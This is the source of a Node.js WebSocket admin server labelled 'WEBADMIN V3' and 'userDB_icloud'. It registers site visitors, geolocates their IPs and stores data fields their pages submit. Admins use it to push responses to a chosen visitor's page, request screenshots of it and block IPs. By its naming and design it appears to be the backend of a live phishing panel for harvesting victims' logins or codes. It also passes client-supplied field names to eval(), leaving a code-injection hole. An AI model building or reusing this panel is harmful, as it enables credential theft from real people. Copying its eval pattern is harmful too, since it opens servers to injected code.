/*/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\ 

	WEBADMIN V3 - 02/10/2020

/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\*/


let database = require('./database.js');
var request = require('sync-request');
var ipapi = require('ipapi.co');

// Minimal amount of secure websocket server
console.log('iniciando userDB_icloud - port : 5013')
var fs = require('fs');

// read ssl certificate
 //var privateKey = fs.readFileSync('localcert/server.key', 'utf8');
 //var certificate = fs.readFileSync('localcert/server.crt', 'utf8');

var privateKey = fs.readFileSync('../sslcert/server.key', 'utf8');
var certificate = fs.readFileSync('../sslcert/server.crt', 'utf8');


var credentials = { key: privateKey, cert: certificate };
var https = require('https');

//pass in your credentials to create an https server
var httpsServer = https.createServer(credentials);
httpsServer.listen(5013);

var http = require('http');

//pass in your credentials to create an https server
var httpServer = http.createServer();
// httpServer.listen(5001);

var server = require('ws').Server;

function verifyClient(info, next) {
    console.log(info.origin);
    var origin_check = info.origin.startsWith("http://192.168.0.103");    
    next(origin_check);
}

var ws = new server({
    server: httpsServer,    
    // server: httpServer,    
    maxPayload: 5000 * 1024,    // Restrict payload size
    //verifyClient: verifyClient
});

// WEBSOCKET SETUP
//let server = require("ws").Server;
//let ws = new server({port: 5001});

/**
 * WEBSOCKET
 */
let ADMIN_COUNT = 0;
let USERS = [];
let count = 0;

let BUCKET_SIZE = 100;
let BURST_DELAY = 1000;





ws.on('connection', function(client){    
    var request_size = 0;
    client.on('message', async function(message){
        // check request limit
        request_size++;        
        if( request_size > BUCKET_SIZE )
        {   
            console.log('Packet Loss: Request Size = ' + request_size + ': Bucket Size = ' + BUCKET_SIZE);            
            setTimeout(function() {
                client.close();            
            }, 100);
            return;
        }

        message = JSON.parse(message);
        var client_ip = client._socket.remoteAddress;
        client_ip = client_ip.replace('::ffff:', '');
		
		 var country = '';
		 var region = '';
		 var city = '';
         var country_code = '';

         // Dummy IP
       // if( client_ip.includes('127.0.0.1') )
        if( client_ip == '127.0.0.1' )
            client_ip = '49.56.156.66';

        // var client_ip = req.headers['x-forwarded-for'].split(/\s*,\s*/)[0];
        message.ip = client_ip;

       

        // check country/region From IP
        ip_country_region = await database.getIPCountryRegion(message.ip);
        if( !ip_country_region || ip_country_region.length < 1 )
        {
            ipapi.location(async function(loc) {  // get country region from ip
                country = loc.country_name;
                region = loc.region;
                country_code = loc.country_code;
                city = loc.city;

                database.addIPCountryRegion(client_ip, country, country_code, city, region , );
            }, message.ip);    
        }
        else
        {
            country = ip_country_region[0].country;
            country_code = ip_country_region[0].country_code;
            city = ip_country_region[0].city;
            region = ip_country_region[0].region;
        }

        console.log('IP = ' + client_ip + ': Country = ' + country  + ': Country_code = ' + country_code  + ': City = ' + city + ': Region = ' + region );

        var blocked_flag = await database.isBlackIP(client_ip);

        // blocked_flag = false;

        if( blocked_flag )
        {
            var response = {action: "blocked", message: 'Your IP is blocked, your connection will be disconnected'};            
            client.send(JSON.stringify(response));

            // close web socket
            setTimeout(function() {
                client.close();
            }, 3000);

            return;
        }

        var token = generate(10);

        switch(message.action){
            case "login":
                let email = message.email
                let pass = message.password;

                console.log(email+" is trying to login...");
                client.send(JSON.stringify(await database.login(email, pass)));
                break;
            case "validate":
                result = await database.getUserData(message.key);

                var response = {action: "validate-response", token: token};
                console.log(result);
                if(result!=null && result.length!=0)
                {
                    client.id = message.key;
                    client.position = "admin";
                    response.status = "ok";

                    ADMIN_COUNT++;
                    notifyAdminConnected(ws, true);
                    notifyAdminNewUser(ws, false);
                }
                else 
                    response.status = "error";
                
                client.token = token;
                client.send(JSON.stringify(response));
                break;
            case "create-user":

                var preset = require(`./preset.js`);
                preset[message.type].site.name = message.name;
                preset[message.type].site.site = message.site;
                console.log(preset[message.type]);
                result = await database.createUser(message.id, preset[message.type], message.ip, country, region);

                var response = {action: "create-user-response"};
                if(result.result.ok){
                    response.status = "ok";
                    response.id = message.id;
                }else response.status = "error";

                console.log(response);
                client.send(JSON.stringify(response));
                break;
            case "user-validate":
                var userData = await database.getData({id: message.id}, "users");
                    
                var response = {action: "user-validate-response", token: token};
                if(userData.length!=0){
                    // REGISTER IN WEBSOCKET
                    client.id = message.id;
                    client.position = "default";
                    await database.updateStatus(message.id, true);

                    // update ip, country, region
                    await database.updateUser(message.id, message.ip, country, country_code, city, region);
                    
                    console.log(client.id+" connected");
                    notifyAdminNewUser(ws, true);

                    response.status = "ok";
                }
                else 
                    response.status = "error";

                client.token = token;    

                client.send(JSON.stringify(response));
                
                break;
            case "send-response":
                if( client.token != message.token )
                    return;

                sendMessage(ws, message.id, {response1: message.res1, response2: message.res2}, "response");
                break;
            case "send-command":
                if( client.token != message.token )
                    return;
                let id = message.id;
                let type = message.type;
                let responseData = message.response;;
                let admin = message.admin; 

                await database.updateData(id, "data.buttons.buttons_config."+type+".response", JSON.stringify(responseData)+"");
                let r = await database.validateUser(id);

                let a = {
                    name: r[0].data.site.name,
                    user_id: r[0]._id,
                    status_panel: r[0].isActive
                };

                eval("a.response = r[0].data.buttons.buttons_config."+type);

                if (a.status_panel) sendMessage(ws, message.id, a, "command", admin);
                else sendMessage(ws, message.id, a, "command", admin);
                break;
				
				
            case "page-user":
                if( client.token != message.token )
                    return;

                let header = Object.keys(message.data);
                header.forEach(async function(dName){
                    if(dName.indexOf("data_")!=-1){
                        eval("var t = message.data."+dName);

                        let resp = await database.updateData(message.data.user_id, "data.data."+dName+".data", "\""+t+"\"");
                        console.log("Data updated...");
                        updateAdminUser(ws, message.data.user_id);
                    }
                });
                break;
            case "get-user-data": 
                if( client.token != message.token )
                    return;

                var userData = await database.validateUser(message.userkey);
                client.send(JSON.stringify({action: "view-user-data", data: userData[0].data}));
                break;
            case "screenshot":
                if( client.token != message.token )
                    return;

                ws.clients.forEach(function e(c){
                    if(c.id==message.userid) c.send(JSON.stringify({action: "screenshot", admin: message.adminid}));
                });
                break;
            case "screenshot-response":
                if( client.token != message.token )
                    return;

                ws.clients.forEach(function e(c){
                    if(c.id==message.admin) c.send(JSON.stringify({action: "screenshot-response", canvas: message.canvas}));
                });
                break;
            case "delete-item":
                if( client.token != message.token )
                    return;

                await database.deleteItem(message.id);
                notifyAdminNewUser(ws, false);                

                break;
            case "block-item":
                if( client.token != message.token )
                    return;

                var userData = await database.getData({id: message.id}, "users");
                    
                if(userData.length!=0)
                {
                    await database.addBlackIP(userData[0].ip);
                    // await database.deleteItem(message.id);
                    ws.clients.forEach(function e(c){
                        if(c.id==message.id) 
                        {
                            c.close();
                        }        
                    });
                }
                
                break;    
            case "ping":
                var response = {action: "pong"};                    
                client.send(JSON.stringify(response));
                break;
        }

        setTimeout(function() {
            request_size--;
        }, BURST_DELAY);
    });

    client.on('close', async ()=>{
        await database.updateStatus(client.id, false);
        console.log(client.id+" disconnected");
        notifyAdminNewUser(ws, false);

        
        if(client.position=="admin"){
            ADMIN_COUNT--;
            notifyAdminConnected(ws, false);
        }
    });

    client.on('error', async function(error){
        console.log('Error', error);
    });
});



/* FUNCTIONS /\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\ */



function generate(count) {
    var _sym = 'abcdefghijklmnopqrstuvwxyz1234567890';
    var str = '';

    for(var i = 0; i < count; i++) {
        str += _sym[parseInt(Math.random() * (_sym.length))];
    }
    
    return str;
}




async function notifyAdminConnected(ws, isNew){
    ws.clients.forEach(function e(c){
        if(c.position=="default"){
            c.send(JSON.stringify({action: "admin-status", status: isNew, total: ADMIN_COUNT}));
        }
    });
}


async function sendMessage(ws, id, command, actionType, admin){
    ws.clients.forEach(function e(c){
        if(c.id==id){
            c.send(JSON.stringify({action: actionType, command: command}));
        }else if(c.id==admin){
            c.send(JSON.stringify({action: "command-executed" , isActive: command.status_panel}));
        }
    }); 
}


async function notifyAdminNewUser(ws, notify){
    let data = []; 
    let users = await database.getData({}, "users");

    users.forEach((user)=>{
        var site = '';
        if( user.data != null )
            site = user.data.site;
        data.push({name: user.name, id: user.id, site: site, isActive: user.isActive, ip: user.ip, country: user.country, country_code: user.country_code, city: user.city, region: user.region});
    });

    ws.clients.forEach(function e(client){
        if(client.position=="admin"){
            client.send(JSON.stringify({action: "refresh-users", users: data, notify: notify}));
        }
    }); 
}


async function updateAdminUser(ws, id){
    ws.clients.forEach(function e(client){
        if(client.position=="admin"){
            client.send(JSON.stringify({action: "reload-admin-data", id: id}));
        }
    }); 
}





